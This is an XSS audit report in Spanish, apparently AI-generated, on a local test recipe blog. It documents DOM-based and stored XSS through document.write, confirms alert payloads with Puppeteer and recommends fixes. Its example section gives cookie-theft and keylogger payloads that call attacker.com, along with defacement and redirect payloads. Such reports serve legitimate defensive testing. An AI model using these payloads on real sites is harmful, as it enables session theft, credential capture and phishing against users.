# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-20T12:44:11  
**Objetivo:** http://web.dev.local:8082  
**Modelo:** Claude Sonnet 4.6  
**Tipo de análisis:** Vulnerabilidades XSS (Cross-Site Scripting)  
**Estado:** ✅ Vulnerabilidades encontradas y explotadas

---

## Resumen Ejecutivo

Se identificaron y explotaron con éxito **dos tipos de vulnerabilidades XSS** en la aplicación web "Blog de Recetas":

1. **DOM-Based XSS** en el parámetro `search` — ejecutado inmediatamente al cargar la página.
2. **Stored XSS (almacenado)** en los parámetros `name` y `comment` — persistente en `localStorage`, se ejecuta en cada recarga de página.

Todas las vulnerabilidades fueron confirmadas mediante ejecución real de código JavaScript en el navegador (dialogs de `alert` disparados con Puppeteer).

---

## Descripción del Objetivo

La aplicación web es un "Blog de Recetas" que ofrece:
- **Sección de búsqueda**: formulario GET con parámetro `search`.
- **Sección de comentarios**: formulario GET con parámetros `name` y `comment`.

Ambas secciones utilizan `document.write()` con valores obtenidos directamente de la URL (`URLSearchParams`) **sin ninguna sanitización ni codificación**, lo que crea superficies de ataque XSS.

---

## Vulnerabilidades Encontradas

### VULN-001: DOM-Based XSS — Parámetro `search`

| Campo | Detalle |
|-------|---------|
| **Tipo** | DOM-Based XSS |
| **Severidad** | Alta (CVSS v3: ~7.4) |
| **Parámetro** | `search` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?search=<PAYLOAD>` |
| **Vector de ataque** | Enlace malicioso enviado a la víctima |

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
// ...
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

El valor del parámetro `search` se inserta directamente en `document.write()` sin escapar, permitiendo la inyección de HTML/JavaScript.

**Payloads probados y confirmados:**

```
# Payload con img/onerror:
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS_SEARCH')>
→ RESULT: alert("XSS_SEARCH") ejecutado ✅

# Payload con SVG/onload:
http://web.dev.local:8082/?search=<svg onload=alert('XSS_SVG')>
→ RESULT: alert("XSS_SVG") ejecutado ✅
```

---

### VULN-002: Stored XSS (Persistente) — Parámetros `name` y `comment`

| Campo | Detalle |
|-------|---------|
| **Tipo** | Stored XSS (via `localStorage`) |
| **Severidad** | Alta (CVSS v3: ~8.0) |
| **Parámetros** | `name` y `comment` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>` |
| **Vector de ataque** | El payload se almacena en `localStorage` y se ejecuta en cada recarga |

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Al mostrar comentarios (sin sanitización):
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores se guardan en `localStorage` y se renderizan con `document.write()` sin escapar en cada carga de página.

**Payloads probados y confirmados:**

```
# Primer acceso (almacena el payload):
http://web.dev.local:8082/?name=attacker&comment=<img src=x onerror=alert('STORED_XSS')>
→ RESULT: alert("STORED_XSS") ejecutado en la primera carga ✅

# Recarga posterior (reproduce el payload almacenado):
http://web.dev.local:8082/
→ RESULT: alert("STORED_XSS") ejecutado de nuevo ✅ (persistente)
```

---

## Prueba de Concepto (PoC)

Se ejecutó una prueba automatizada con **Puppeteer** (navegador headless Chromium) que confirmó la ejecución real de JavaScript en el contexto del navegador:

```
Test 1: DOM XSS via search - img onerror   → DIALOG FIRED: alert : XSS_SEARCH  ✅
Test 2: DOM XSS via search - SVG onload    → DIALOG FIRED: alert : XSS_SVG     ✅
Test 3: Stored XSS via comment             → DIALOG FIRED: alert : STORED_XSS  ✅
Test 4: Stored XSS en recarga              → DIALOG FIRED: alert : STORED_XSS  ✅

Total de ataques exitosos: 4 / 4
```

### Payloads de mayor impacto (ejemplos)

```javascript
// Robo de cookies:
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// Keylogger:
<img src=x onerror="document.onkeydown=function(e){fetch('https://attacker.com/k?k='+e.key)}">

// Defacement:
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">

// Redirección:
<svg onload="window.location='https://attacker.com/phishing'">
```

---

## Análisis de Impacto

| Impacto | Descripción |
|---------|-------------|
| **Robo de sesión** | Si hay cookies de sesión, pueden ser exfiltradas |
| **Phishing** | Redirección a páginas falsas desde el dominio legítimo |
| **Defacement** | Modificación del contenido visible de la página |
| **Keylogging** | Captura de pulsaciones de teclas (credenciales) |
| **Persistencia** | El Stored XSS se ejecuta en cada visita (afecta al propio usuario) |

---

## Causa Raíz

La causa raíz de ambas vulnerabilidades es el uso de `document.write()` con datos controlados por el usuario sin ninguna sanitización. El código JavaScript toma valores directamente de `URLSearchParams` y los inserta en el DOM sin encoding HTML.

---

## Recomendaciones

### 1. Eliminar `document.write()` — usar DOM API segura

**En lugar de:**
```javascript
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

**Usar:**
```javascript
const p = document.createElement('p');
const strong = document.createElement('strong');
strong.textContent = searchTerm; // textContent escapa automáticamente
p.appendChild(document.createTextNode('Resultados para: '));
p.appendChild(strong);
container.appendChild(p);
```

### 2. Sanitizar siempre antes de insertar en el DOM

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}
// Uso:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

### 3. Usar `innerHTML` con contenido sanitizado o `textContent`

```javascript
element.textContent = userInput; // Seguro: no interpreta HTML
// O con librería como DOMPurify:
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 4. Implementar Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 5. Validar datos almacenados en `localStorage`

No almacenar ni renderizar directamente contenido HTML de usuarios. Tratar todo contenido de `localStorage` como datos no confiables.

---

## Conclusión

La aplicación **http://web.dev.local:8082** presenta vulnerabilidades XSS críticas y explotables en dos vectores distintos: DOM-Based XSS en la búsqueda y Stored XSS en los comentarios. Ambas vulnerabilidades fueron explotadas exitosamente, confirmando la ejecución de código JavaScript arbitrario en el contexto del navegador de la víctima.

Se recomienda aplicar de inmediato las correcciones indicadas, especialmente la eliminación de `document.write()` con datos de usuario y la adopción de APIs DOM seguras.

---

*Informe generado el 2026-04-20T12:44:11 — Auditoría autorizada*
